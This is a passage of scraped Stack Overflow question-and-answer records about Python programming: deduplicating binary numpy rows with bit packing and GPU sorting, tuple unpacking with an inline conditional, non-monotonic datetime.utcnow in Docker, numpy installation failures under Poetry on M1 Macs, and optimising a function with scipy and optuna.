    duplicate_indices = [int(x) for x in np.argwhere(duplicate_counts &gt;= threshold)]
    print(f'Time: {datetime.datetime.now()}')

    print(f'Unique rows: {len(unique_rows)} Sample inds: {duplicate_indices[0:5]} Sample counts: {duplicate_counts[0:5]}')
    print(f'Sample rows:')
    print(unique_rows[0:5])

</code></pre>
<p>My output is as follows:</p>
<pre><code>All rows have 8 elements: True
Time: 2022-06-29 12:08:07.320834
Time: 2022-06-29 12:08:23.281633
Unique rows: 1799994 Sample inds: [508991, 553136, 930379, 1128637, 1290356] Sample counts: [1 1 1 1 1]
Sample rows:
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
  0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
  0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 1 1 0 0 1 1 0 0 0 1 0 0 0 0 0 0 1 0 1 0]
 [0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
  0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
  0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 1 1 0 0 0 0 0 1 1 1 1 0 0 0 0 1 0 0 0 0 0]
 [0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
  0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
  0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 0 0 0 0 1 0 1 0 0 1 0 0 0 1 0 1 0 1 0 0 0]
 [0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
  0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
  0 0 0 0 0 0 0 0 0 0 0 1 0 1 1 0 0 0 0 1 1 0 0 0 0 0 0 1 1 0 1 0 0 0 0 0]
 [0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
  0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
  0 0 0 0 0 0 0 0 0 0 1 1 0 0 0 0 1 0 0 0 1 0 1 1 0 0 0 0 0 1 0 0 0 0 1 0]]
</code></pre>
<p>I have considered using numba, but the challenge is that it does not operate using an axis parameter.  Similarly, conversion to list and utilization of sets is an option, but then looping through to perform the duplicate counts seems &quot;unpythonic&quot;.</p>
<p>Given that I need to run this code multiple times (since I am modifying the numpy array and then needing to re-search for duplicates), the time is critical. I have also tried to use multiprocessing against this step but the np.unique seems to be blocking (i.e. even when I try to run multiple versions of this, I end up constrained to one thread running at 6% CPU capacity while the other threads sit idle).</p>
","72836634","<h2>Step 1: bit packing</h2>
<p>Since your matrix only contains binary values, you can <strong>aggressively pack the bits into uint64 values</strong> so to perform a much more efficient sort then. Here is a Numba implementation:</p>
<pre class=""lang-py prettyprint-override""><code>import numpy as np
import numba as nb

@nb.njit('(uint8[:,::1],)', parallel=True)
def pack_bits(mat):
    n, m = mat.shape
    res = np.zeros((n, (m+63)//64), np.uint64)
    for i in nb.prange(n):
        for bj in range(0, m, 64):
            val = np.uint64(0)
            if bj + 64 &lt;= m:
                # Fast case
                for j in range(64):
                    val += np.uint64(mat[i, bj+j]) &lt;&lt; (63 - j)
            else:
                # Slow case (boundary)
                for j in range(m - bj):
                    val += np.uint64(mat[i, bj+j]) &lt;&lt; (63 - j)
            res[i, bj//64] = val
    return res

@nb.njit('(uint64[:,::1], int_)', parallel=True)
def unpack_bits(mat, m):
    n = mat.shape[0]
    assert mat.shape[1] == (m+63)//64
    res = np.zeros((n, m), np.uint64)
    for i in nb.prange(n):
        for bj in range(0, m, 64):
            val = np.uint64(mat[i, bj//64])
            if bj + 64 &lt;= m:
                # Fast case
                for j in range(64):
                    res[i, bj+j] = np.uint8((val &gt;&gt; (63 - j)) &amp; 1)
            else:
                # Slow case (boundary)
                for j in range(m - bj):
                    res[i, bj+j] = np.uint8((val &gt;&gt; (63 - j)) &amp; 1)
    return res
</code></pre>
<p>The <code>np.unique</code> function can be called on the much smaller packed array like in the initial code (except the resulting sorted array is a packed one and need to be unpacked). Since you do not need the indices, it is better not to compute it. Thus, <code>return_index=True</code> can be removed. Additionally, only the required values can be unpacked (unpacking is a bit more expensive than packing because writing a big matrix is more expensive than reading an existing one).</p>
<pre class=""lang-py prettyprint-override""><code>if __name__ == '__main__':
    threshold = 2
    n, m = 1800000, 108
    mat = create_mat(n, m, 8)

    print(f'Time: {datetime.datetime.now()}')
    packed_mat = pack_bits(mat)
    duplicate_packed_rows, duplicate_counts = np.unique(packed_mat, axis=0, return_counts=True)
    duplicate_indices = [int(x) for x in np.argwhere(duplicate_counts &gt;= threshold)]
    print(f'Time: {datetime.datetime.now()}')

    print(f'Duplicate rows: {len(duplicate_rows)} Sample inds: {duplicate_indices[0:5]} Sample counts: {duplicate_counts[0:5]}')
    print(f'Sample rows:')
    print(unpack_bits(duplicate_packed_rows[0:5], m))
</code></pre>
<hr />
<h2>Step 2: <code>np.unique</code> optimizations</h2>
<p>The <code>np.unique</code> call is sub-optimal as it performs multiple expensive internal sorting steps. Not all of them are needed in your <em>specific case</em> and some step can be optimized.</p>
<p>A more efficient implementation consists in sorting the last column during a first step, then sorting the previous column, and so on until the first column is sorted similar to what a Radix sort does. Note that the last column can be sorted using a non-stable algorithm (generally faster) but the others need a stable one. This method is still sub-optimal as <code>argsort</code> calls are slow and the current implementation does not use multiple threads yet. Unfortunately, Numpy does not proving any efficient way to sort rows of a 2D array yet. While it is possible to reimplement this in Numba, this is cumbersome, a bit tricky to do and bug prone. Not to mention Numba introduce some overheads compared to a native C/C++ code. Once sorted, the unique/duplicate rows can be tracked and counted. Here is an implementation:</p>
<pre class=""lang-py prettyprint-override""><code>def sort_lines(mat):
    n, m = mat.shape

    for i in range(m):
        kind = 'stable' if i &gt; 0 else None
        mat = mat[np.argsort(mat[:,m-1-i], kind=kind)]

    return mat

@nb.njit('(uint64[:,::1],)', parallel=True)
def find_duplicates(sorted_mat):
    n, m = sorted_mat.shape
    assert m &gt;= 0

    isUnique = np.zeros(n, np.bool_)
    uniqueCount = 1
    if n &gt; 0:
        isUnique[0] = True
    for i in nb.prange(1, n):
        isUniqueVal = False
        for j in range(m):
            isUniqueVal |= sorted_mat[i, j] != sorted_mat[i-1, j]
        isUnique[i] = isUniqueVal
        uniqueCount += isUniqueVal

    uniqueValues = np.empty((uniqueCount, m), np.uint64)
    duplicateCounts = np.zeros(len(uniqueValues), np.uint64)

    cursor = 0
    for i in range(n):
        cursor += isUnique[i]
        for j in range(m):
            uniqueValues[cursor-1, j] = sorted_mat[i, j]
        duplicateCounts[cursor-1] += 1

    return uniqueValues, duplicateCounts
</code></pre>
<p>The previous <code>np.unique</code> call can be replaced by <code>find_duplicates(sort_lines(packed_mat))</code>.</p>
<h2>Step 3: GPU-based <code>np.unique</code></h2>
<p>While implementing a fast algorithm to sort row is not easy on CPU with Numba and Numpy, one can simply use CuPy to do that on the GPU assuming a Nvidia GPU is available and CUDA is installed (as well as CuPy). This solution has the benefit of being simple and significantly more efficient. Here is an example:</p>
<pre class=""lang-py prettyprint-override""><code>import cupy as cp

def cupy_sort_lines(mat):
    cupy_mat = cp.array(mat)
    return cupy_mat[cp.lexsort(cupy_mat.T[::-1,:])].get()
</code></pre>
<p>The previous <code>sort_lines</code> call can be replaced by <code>cupy_sort_lines</code>.</p>
<hr />
<h2>Results</h2>
<p>Here are the timings on my machine with a 6-core i5-9600KF CPU and a Nvidia 1660 Super GPU:</p>
<pre class=""lang-none prettyprint-override""><code>Initial version:        15.541 s
Optimized packing:       0.982 s
Optimized np.unique:     0.634 s
GPU-based sorting:       0.143 s   (require a Nvidia GPU)
</code></pre>
<p>Thus, the CPU-based optimized version is about <strong>25 times faster</strong> and the GPU-based one is <strong>109 times faster</strong>. Note that the sort take a significant time in all versions. Also, please note that the unpacking is not included in the benchmark (as seen in the provided code). It takes a negligible time as long as only few rows are unpacked and not all the full array (which takes roughtly ~200 ms on my machine). This last operation can be further optimized at the expense of a significantly more complex implementation.</p>
"
"72845828","1","Priority of tuple (un)packing with inline if-else","<p>Apologies in advance for the obscure title. I wasn't sure how to phrase what I encountered.</p>
<p>Imagine that you have a title of a book alongside its author, separated by <code>-</code>, in a variable <code>title_author</code>. You scraped this information from the web so it might very well be that this item is <code>None</code>. Obviously you would like to separate the title from the author, so you'd use split. But in case <code>title_author</code> is None to begin with, you just want both <code>title</code> and <code>author</code> to be <code>None</code>.</p>
<p>I figured that the following was a good approach:</p>
<pre class=""lang-py prettyprint-override""><code>title_author = &quot;In Search of Lost Time - Marcel Proust&quot;
title, author = title_author.split(&quot;-&quot;, 1) if title_author else None, None
print(title, author)
# ['In Search of Lost Time ', ' Marcel Proust'] None
</code></pre>
<p>But to my surprise, <code>title</code> now was the result of the split and <code>author</code> was <code>None</code>. The solution is to explicitly indicate that the else clause is a tuple by means of parentheses.</p>
<pre class=""lang-py prettyprint-override""><code>title, author = title_author.split(&quot;-&quot;, 1) if title_author else (None, None)
print(title, author) 
# In Search of Lost Time   Marcel Proust
</code></pre>
<p>So why is this happening? What is the order of execution here that lead to the result in the first case?</p>
","72845910","<pre><code>title, author = title_author.split(&quot;-&quot;, 1) if title_author else None, None
</code></pre>
<p>is the same as:</p>
<pre><code>title, author = (title_author.split(&quot;-&quot;, 1) if title_author else None), None
</code></pre>
<p>Therefore, <code>author</code> is always <code>None</code></p>
<hr>
<p><strong>Explaination</strong>:</p>
<p>From <a href=""https://docs.python.org/3/reference/simple_stmts.html#grammar-token-python-grammar-assignment_stmt"" rel=""nofollow noreferrer"">official doc</a></p>
<blockquote>
<p>An assignment statement evaluates the expression list (remember that
this can be a single expression or a comma-separated list, the latter
yielding a tuple) and assigns the single resulting object to each of
the target lists, from left to right.</p>
</blockquote>
<p>That is to say, the interrupter will look for <code>(x,y)=(a,b)</code> and assign value as <code>x=a</code> and <code>y=b</code>.</p>
<p>In your case, there are two interpretation, the main differece is that :</p>
<ol>
<li><p><code>title, author = (title_author.split(&quot;-&quot;, 1) if title_author else None), None</code>
is assigning two values (a list or a None and a None) to two variables and no unpacking is needed.</p>
</li>
<li><p><code>title, author = title_author.split(&quot;-&quot;, 1) if title_author else (None, None)</code> is actually assigning one value (a list or a tuple) to two variable, which need an unpacking step to map two variables to the two values in the list/tuple.</p>
</li>
</ol>
<p>As option 1 can be completed without unpacking, i.e. less operation, the interrupter will go with option 1 without explicit instructions.</p>
"
"72369250","1","Weird datetime.utcnow() bug","<p>Consider this simple Python script:</p>
<pre><code>$ cat test_utc.py
from datetime import datetime

for i in range(10_000_000):
    first = datetime.utcnow()
    second = datetime.utcnow()

    assert first &lt;= second, f&quot;{first=} {second=} {i=}&quot;
</code></pre>
<p>When I run it from the shell like <code>python test_utc.py</code> it finishes w/o errors, just as expected. However, when I run it in a Docker container the assertion fails:</p>
<pre><code>$ docker run -it --rm -v &quot;$PWD&quot;:/code -w /code python:3.10.4 python test_utc.py
Traceback (most recent call last):
  File &quot;/code/test_utc.py&quot;, line 7, in &lt;module&gt;
    assert first &lt;= second, f&quot;{first=} {second=} {i=}&quot;
AssertionError: first=datetime.datetime(2022, 5, 24, 19, 5, 1, 861308) second=datetime.datetime(2022, 5, 24, 19, 5, 1, 818270) i=1818860
</code></pre>
<p>How is it possible?</p>
<p>P.S. a colleague has reported that increasing the range parameter to <code>100_000_000</code> makes it fail in the shell on their mac as well (but not for me).</p>
","72369605","<p><a href=""https://docs.python.org/3/library/datetime.html#datetime.datetime.utcnow"" rel=""nofollow noreferrer""><code>utcnow</code></a> refers to <a href=""https://docs.python.org/3/library/datetime.html#datetime.datetime.now"" rel=""nofollow noreferrer""><code>now</code></a> refers to <a href=""https://docs.python.org/3/library/datetime.html#datetime.datetime.today"" rel=""nofollow noreferrer""><code>today</code></a> refers to <a href=""https://docs.python.org/3/library/datetime.html#datetime.datetime.fromtimestamp"" rel=""nofollow noreferrer""><code>fromtimestamp</code></a> refers to <a href=""https://docs.python.org/3/library/time.html#time.time"" rel=""nofollow noreferrer""><code>time</code></a>, which says:</p>
<blockquote>
<p>While this function normally returns non-decreasing values, it can return a lower value than a previous call if the system clock has been set back between the two calls.</p>
</blockquote>
<p>The <a href=""https://github.com/python/cpython/blob/v3.10.4/Lib/datetime.py#L1702"" rel=""nofollow noreferrer""><code>utcnow</code> code</a> also shows its usage of <code>time</code>:</p>
<pre><code>def utcnow(cls):
    &quot;Construct a UTC datetime from time.time().&quot;
    t = _time.time()
    return cls.utcfromtimestamp(t)
</code></pre>
<p>Such system clock updates are also why <a href=""https://docs.python.org/3/library/time.html#time.monotonic"" rel=""nofollow noreferrer""><code>monotonic</code></a> exists, which says:</p>
<blockquote>
<p>Return the value (in fractional seconds) of a monotonic clock, i.e. a clock that cannot go backwards. The clock is not affected by system clock updates.</p>
</blockquote>
<p>And <code>utcnow</code> has no such guarantee.</p>
<p>Your computer doesn't have a perfect clock, every now and then it synchronizes via the internet with more accurate clocks, possibly adjusting it backwards. See for example <a href=""https://cs.stackexchange.com/q/54933/116970"">answers here</a>.</p>
<p>And looks like Docker makes it worse, see for example <a href=""https://www.docker.com/blog/addressing-time-drift-in-docker-desktop-for-mac/"" rel=""nofollow noreferrer"">Addressing Time Drift in Docker Desktop for Mac</a> from the Docker blog. Excerpt:</p>
<blockquote>
<p>macOS doesn’t have native container support. The helper VM has its own internal clock, separate from the host’s clock. When the two clocks drift apart then suddenly commands which rely on the time, or on file timestamps, may start to behave differently</p>
</blockquote>
<p>Lastly, you can increase your chance to catch a backwards update when one occurs. If one occurs not between getting <code>first</code> and <code>second</code> but between <code>second</code> and the next <code>first</code>, you'll miss it! Below code fixes that issue and is also micro-optimized (including removing the <code>utcnow</code> middle man) so it checks faster / more frequently:</p>
<pre><code>import time
from itertools import repeat

def function():
    n = 10_000_000
    reps = repeat(1, n)
    now = time.time
    first = now()
    for _ in reps:
        second = now()
        assert first &lt;= second, f&quot;{first=} {second=} i={n - sum(reps)}&quot;
        first = second
function()
</code></pre>
"
"71764027","1","Numpy installation fails when installing with Poetry on M1 and macOS","<p>I have a Numpy as a dependency in Poetry <code>pyproject.toml</code> file and it fails to install.</p>
<pre><code>  error: the clang compiler does not support 'faltivec', please use -maltivec and include altivec.h explicitly
              error: Command &quot;clang -Wno-unused-result -Wsign-compare -Wunreachable-code -fno-common -dynamic -DNDEBUG -g -fwrapv -O3 -Wall -isysroot /Library/Developer/CommandLineTools/SDKs/MacOSX12.sdk -DNPY_INTERNAL_BUILD=1 -DHAVE_NPY_CONFIG_H=1 -D_FILE_OFFSET_BITS=64 -D_LARGEFILE_SOURCE=1 -D_LARGEFILE64_SOURCE=1 -DNO_ATLAS_INFO=3 -DHAVE_CBLAS -Ibuild/src.macosx-12-arm64-3.9/numpy/core/src/umath -Ibuild/src.macosx-12-arm64-3.9/numpy/core/src/npymath -Ibuild/src.macosx-12-arm64-3.9/numpy/core/src/common -Inumpy/core/include -Ibuild/src.macosx-12-arm64-3.9/numpy/core/include/numpy -Inumpy/core/src/common -Inumpy/core/src -Inumpy/core -Inumpy/core/src/npymath -Inumpy/core/src/multiarray -Inumpy/core/src/umath -Inumpy/core/src/npysort -I/Users/moo/Library/Caches/pypoetry/virtualenvs/dex-ohlcv-qY1n4duk-py3.9/include -I/opt/homebrew/Cellar/python@3.9/3.9.12/Frameworks/Python.framework/Versions/3.9/include/python3.9 -Ibuild/src.macosx-12-arm64-3.9/numpy/core/src/common -Ibuild/src.macosx-12-arm64-3.9/numpy/core/src/npymath -c numpy/core/src/multiarray/array_assign_scalar.c -o build/temp.macosx-12-arm64-3.9/numpy/core/src/multiarray/array_assign_scalar.o -MMD -MF build/temp.macosx-12-arm64-3.9/numpy/core/src/multiarray/array_assign_scalar.o.d -faltivec -I/System/Library/Frameworks/vecLib.framework/Headers&quot; failed with exit status 1
              [end of output]
        
          note: This error originates from a subprocess, and is likely not a problem with pip.
          ERROR: Failed building wheel for numpy
        Failed to build numpy
</code></pre>
<ul>
<li>macOS Big Sur</li>
<li>Python 3.9 installed through Homebrew</li>
</ul>
<p>How to solve it?</p>
<p>If I install Numpy with pip it installs fine.</p>
","71764028","<p>Make sure you have OpenBLAS installed from Homebrew:</p>
<pre><code>brew install openblas
</code></pre>
<p>Then before running any installation script, make sure you tell your shell environment to use Homebrew OpenBLAS installation</p>
<pre class=""lang-sh prettyprint-override""><code>export OPENBLAS=&quot;$(brew --prefix openblas)&quot; 
poetry install
</code></pre>
<p>If you get an error</p>
<pre><code>                File &quot;/private/var/folders/tx/50wn88yd40v2_6_7fvfr98z00000gn/T/pip-build-env-uq7qd2ba/overlay/lib/python3.9/site-packages/wheel/bdist_wheel.py&quot;, line 252, in get_tag
                  plat_name = get_platform(self.bdist_dir)
                File &quot;/private/var/folders/tx/50wn88yd40v2_6_7fvfr98z00000gn/T/pip-build-env-uq7qd2ba/overlay/lib/python3.9/site-packages/wheel/bdist_wheel.py&quot;, line 48, in get_platform
                  result = calculate_macosx_platform_tag(archive_root, result)
                File &quot;/private/var/folders/tx/50wn88yd40v2_6_7fvfr98z00000gn/T/pip-build-env-uq7qd2ba/overlay/lib/python3.9/site-packages/wheel/macosx_libfile.py&quot;, line 356, in calculate_macosx_platform_tag
                  assert len(base_version) == 2
              AssertionError
</code></pre>
<p>This should have been fixed in the recent enough Python packaging tools.</p>
<p>Make sure</p>
<ul>
<li>Poetry is recent enough version</li>
<li>Numpy is recent enough version</li>
<li>Any dependency using Numpy, like Scipy or Pyarrrow are also the most recent version</li>
</ul>
<p>For example in your <code>pyproject.toml</code></p>
<pre><code>[tool.poetry.dependencies]
# For Scipy compatibility
python = &quot;&gt;=3.9,&lt;3.11&quot;

scipy = &quot;^1.8.0&quot;
pyarrow = &quot;^7.0.0&quot;
</code></pre>
<p>Even if this still fails you can try to preinstall <code>scipy</code> with <code>pip</code> before running <code>poetry install</code> in Poetry virtualenv (enter with <code>poetry shell</code>) This should pick up the precompiled scipy wheel. When the precompiled wheel is present, Poetry should not try to install it again and then fail it the build step.</p>
<pre class=""lang-sh prettyprint-override""><code>poetry shell
pip install scipy
</code></pre>
<pre><code>Collecting scipy
  Downloading scipy-1.8.0-cp39-cp39-macosx_12_0_arm64.whl (28.7 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 28.7/28.7 MB 6.0 MB/s eta 0:00:00
Requirement already satisfied: numpy&lt;1.25.0,&gt;=1.17.3 in /Users/moo/Library/Caches/pypoetry/virtualenvs/dex-ohlcv-qY1n4duk-py3.9/lib/python3.9/site-packages (from scipy) (1.22.3)
Installing collected packages: scipy
Successfully installed scipy-1.8.0
</code></pre>
<p>After this run Poetry normally:</p>
<pre><code>poetry install
</code></pre>
"
"72193393","1","Find the value of variables to maximize return of function in Python","<p>I'd want to achieve similar result as how the Solver-function in Excel is working. I've been reading of Scipy optimization and been trying to build a function which outputs what I would like to find the maximal value of. The equation is based on four different variables which, see my code below:</p>
<pre class=""lang-py prettyprint-override""><code>import pandas as pd
import numpy as np
from scipy import optimize

cols = {
    'Dividend2': [9390, 7448, 177], 
    'Probability': [341, 376, 452], 
    'EV': [0.53, 0.60, 0.55], 
    'Dividend': [185, 55, 755], 
    'EV2': [123, 139, 544],
}

df = pd.DataFrame(cols)

def myFunc(params):
    &quot;&quot;&quot;myFunc metric.&quot;&quot;&quot;
    (ev, bv, vc, dv) = params
    df['Number'] = np.where(df['Dividend2'] &lt;= vc, 1, 0) \
                    + np.where(df['EV2'] &lt;= dv, 1, 0)
    df['Return'] =  np.where(
        df['EV'] &lt;= ev, 0, np.where(
            df['Probability'] &gt;= bv, 0, df['Number'] * df['Dividend'] - (vc + dv)
        )
    )
    return -1 * (df['Return'].sum())

b1 = [(0.2,4), (300,600), (0,1000), (0,1000)]
start = [0.2, 600, 1000, 1000]
result = optimize.minimize(fun=myFunc, bounds=b1, x0=start)
print(result)
</code></pre>
<p>So I'd like to find the maximum value of the column Return in df when changing the variables ev,bv,vc &amp; dv. I'd like them to be between in the intervals of ev: 0.2-4, bv: 300-600, vc: 0-1000 &amp; dv: 0-1000.</p>
<p>When running my code it seem like the function stops at x0.</p>
","72252081","<h1>Solution</h1>
<p>I will use <code>optuna</code> library to give you a solution to the type of problem you are trying to solve. I have tried using <code>scipy.optimize.minimize</code> and it appears that the loss-landscape is probably quite flat in most places, and hence the tolerances enforce the minimizing algorithm (<code>L-BFGS-B</code>) to stop prematurely.</p>
<ul>
<li>Optuna Docs: <a href=""https://optuna.readthedocs.io/en/stable/index.html"" rel=""nofollow noreferrer"">https://optuna.readthedocs.io/en/stable/index.html</a></li>
</ul>
<p>With optuna, it rather straight forward. Optuna only requires an <code>objective</code> function and a <code>study</code>. The study send various <code>trials</code> to the <code>objective</code> function, which in turn, evaluates the metric of your choice.</p>
<p>I have defined another metric function <code>myFunc2</code> by mostly removing the <code>np.where</code> calls, as you can do-away with them (reduces number of steps) and make the function slightly faster.</p>
<pre class=""lang-sh prettyprint-override""><code># install optuna with pip
pip install -Uqq optuna
</code></pre>
<p>Although I looked into using a rather smooth loss landscape, sometimes it is necessary to visualize the landscape itself. The answer in section <code>B</code> elaborates on visualization. But, what if you want to use a smoother metric function? Section <strong><code>D</code></strong> sheds some light on this.</p>
<p>Order of code-execution should be:</p>
<ul>
<li>Sections: <strong><code>C</code></strong> &gt;&gt; <strong><code>B</code></strong> &gt;&gt; <strong><code>B.1</code></strong> &gt;&gt; <strong><code>B.2</code></strong> &gt;&gt; <strong><code>B.3</code></strong> &gt;&gt; <strong><code>A.1</code></strong> &gt;&gt; <strong><code>A.2</code></strong> &gt;&gt; <strong><code>D</code></strong></li>
</ul>
<h2>A. Building Intuition</h2>
<p>If you create a hiplot (also known as a plot with parallel-coordinates) with all the possible parameter values as mentioned in the <code>search_space</code> for Section <code>B.2</code>, and plot the lowest 50 outputs of <code>myFunc2</code>, it would look like this:</p>
<p><a href=""https://i.stack.imgur.com/MibyN.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/MibyN.png"" alt=""hiplot-search-space-subset"" /></a></p>
<p>Plotting all such points from the <code>search_space</code> would look like this:</p>
<p><a href=""https://i.stack.imgur.com/mKXRa.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/mKXRa.png"" alt=""hiplot-search-space-full"" /></a></p>
<h3>A.1. Loss Landscape Views for Various Parameter-Pairs</h3>
<p>These figures show that mostly the loss-landscape is flat for any two of the four parameters <code>(ev, bv, vc, dv)</code>. This could be a reason why, only <strong><code>GridSampler</code></strong> (which brute-forces the searching process) does better, compared to the other two samplers (<code>TPESampler</code> and <code>RandomSampler</code>). Please click on any of the images below to view them enlarged. This could also be the reason why <code>scipy.optimize.minimize(method=&quot;L-BFGS-B&quot;)</code> fails right off the bat.</p>
<div class=""s-table-container"">
<table class=""s-table"">
<thead>
<tr>
<th style=""text-align: center;""><a href=""https://i.stack.imgur.com/9UJ4h.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/9UJ4h.png"" alt=""01-dv-vc"" /></a> <br/><br/> <strong><code>01. dv-vc</code></strong></th>
<th style=""text-align: center;""><a href=""https://i.stack.imgur.com/seWOk.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/seWOk.png"" alt=""02-dv-bv"" /></a> <br/><br/> <strong><code>02. dv-bv</code></strong></th>
<th style=""text-align: center;""><a href=""https://i.stack.imgur.com/y2KnW.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/y2KnW.png"" alt=""03-dv-ev"" /></a> <br/><br/> <strong><code>03. dv-ev</code></strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style=""text-align: center;""><a href=""https://i.stack.imgur.com/86hhs.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/86hhs.png"" alt=""04-bv-ev"" /></a> <br/><br/> <strong><code>04. bv-ev</code></strong></td>
<td style=""text-align: center;""><a href=""https://i.stack.imgur.com/9HDEy.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/9HDEy.png"" alt=""05-cv-ev"" /></a> <br/><br/> <strong><code>05. cv-ev</code></strong></td>
<td style=""text-align: center;""><a href=""https://i.stack.imgur.com/sUXHd.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/sUXHd.png"" alt=""06-vc-bv"" /></a> <br/><br/> <strong><code>06. vc-bv</code></strong></td>
</tr>
</tbody>
</table>
</div>
<pre class=""lang-py prettyprint-override""><code># Create contour plots for parameter-pairs
study_name = &quot;GridSampler&quot;
study = studies.get(study_name)

views = [(&quot;dv&quot;, &quot;vc&quot;), (&quot;dv&quot;, &quot;bv&quot;), (&quot;dv&quot;, &quot;ev&quot;), 
         (&quot;bv&quot;, &quot;ev&quot;), (&quot;vc&quot;, &quot;ev&quot;), (&quot;vc&quot;, &quot;bv&quot;)]

for i, (x, y) in enumerate(views):
    print(f&quot;Figure: {i}/{len(views)}&quot;)
    study_contour_plot(study=study, params=(x, y))
</code></pre>
<h3>A.2. Parameter Importance</h3>
<p><a href=""https://i.stack.imgur.com/IucEA.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/IucEA.png"" alt=""07-param-importance"" /></a></p>
<pre class=""lang-py prettyprint-override""><code>study_name = &quot;GridSampler&quot;
study = studies.get(study_name)

fig = optuna.visualization.plot_param_importances(study)
fig.update_layout(title=f'Hyperparameter Importances: {study.study_name}', 
                  autosize=False,
                  width=800, height=500,
                  margin=dict(l=65, r=50, b=65, t=90))
fig.show()
</code></pre>
<h2>B. Code</h2>
<p>Section <strong><code>B.3.</code></strong> finds the lowest metric <code>-88.333</code> for:</p>
<ul>
<li><code>{'ev': 0.2, 'bv': 500.0, 'vc': 222.2222, 'dv': 0.0}</code></li>
</ul>
<pre class=""lang-py prettyprint-override""><code>import warnings
from functools import partial
from typing import Iterable, Optional, Callable, List

import pandas as pd
import numpy as np
import optuna
from tqdm.notebook import tqdm

warnings.filterwarnings(&quot;ignore&quot;, category=optuna.exceptions.ExperimentalWarning)
optuna.logging.set_verbosity(optuna.logging.WARNING)

PARAM_NAMES: List[str] = [&quot;ev&quot;, &quot;bv&quot;, &quot;vc&quot;, &quot;dv&quot;,]
DEFAULT_METRIC_FUNC: Callable = myFunc2


def myFunc2(params):
    &quot;&quot;&quot;myFunc metric v2 with lesser steps.&quot;&quot;&quot;
    global df # define as a global variable
    (ev, bv, vc, dv) = params
    df['Number'] = (df['Dividend2'] &lt;= vc) * 1 + (df['EV2'] &lt;= dv) * 1
    df['Return'] =  (
        (df['EV'] &gt; ev) 
        * (df['Probability'] &lt; bv) 
        * (df['Number'] * df['Dividend'] - (vc + dv))
    )
    return -1 * (df['Return'].sum())


def make_param_grid(
        bounds: List[Tuple[float, float]], 
        param_names: Optional[List[str]]=None, 
        num_points: int=10, 
        as_dict: bool=True,
    ) -&gt; Union[pd.DataFrame, Dict[str, List[float]]]:
    &quot;&quot;&quot;
    Create parameter search space.

    Example:
    
        grid = make_param_grid(bounds=b1, num_points=10, as_dict=True)
    
    &quot;&quot;&quot;
    if param_names is None:
        param_names = PARAM_NAMES # [&quot;ev&quot;, &quot;bv&quot;, &quot;vc&quot;, &quot;dv&quot;]
    bounds = np.array(bounds)
    grid = np.linspace(start=bounds[:,0], 
                       stop=bounds[:,1], 
                       num=num_points, 
                       endpoint=True, 
                       axis=0)
    grid = pd.DataFrame(grid, columns=param_names)
    if as_dict:
        grid = grid.to_dict()
        for k,v in grid.items():
            grid.update({k: list(v.values())})
    return grid


def objective(trial, 
              bounds: Optional[Iterable]=None, 
              func: Optional[Callable]=None, 
              param_names: Optional[List[str]]=None):
    &quot;&quot;&quot;Objective function, necessary for optimizing with optuna.&quot;&quot;&quot;
    if param_names is None:
        param_names = PARAM_NAMES
    if (bounds is None):
        bounds = ((-10, 10) for _ in param_names)
    if not isinstance(bounds, dict):
        bounds = dict((p, (min(b), max(b))) 
                        for p, b in zip(param_names, bounds))
    if func is None:
        func = DEFAULT_METRIC_FUNC

    params = dict(
        (p, trial.suggest_float(p, bounds.get(p)[0], bounds.get(p)[1])) 
        for p in param_names        
    )
    # x = trial.suggest_float('x', -10, 10)
    return func((params[p] for p in param_names))


def optimize(objective: Callable, 
             sampler: Optional[optuna.samplers.BaseSampler]=None, 
             func: Optional[Callable]=None, 
             n_trials: int=2, 
             study_direction: str=&quot;minimize&quot;,
             study_name: Optional[str]=None,
             formatstr: str=&quot;.4f&quot;,
             verbose: bool=True):
    &quot;&quot;&quot;Optimizing function using optuna: creates a study.&quot;&quot;&quot;
    if func is None:
        func = DEFAULT_METRIC_FUNC
    study = optuna.create_study(
        direction=study_direction, 
        sampler=sampler, 
        study_name=study_name)
    study.optimize(
        objective, 
        n_trials=n_trials, 
        show_progress_bar=True, 
        n_jobs=1,
    )
    if verbose:
        metric = eval_metric(study.best_params, func=myFunc2)
        msg = format_result(study.best_params, metric, 
                            header=study.study_name, 
                            format=formatstr)
        print(msg)
    return study


def format_dict(d: Dict[str, float], format: str=&quot;.4f&quot;) -&gt; Dict[str, float]:
    &quot;&quot;&quot;
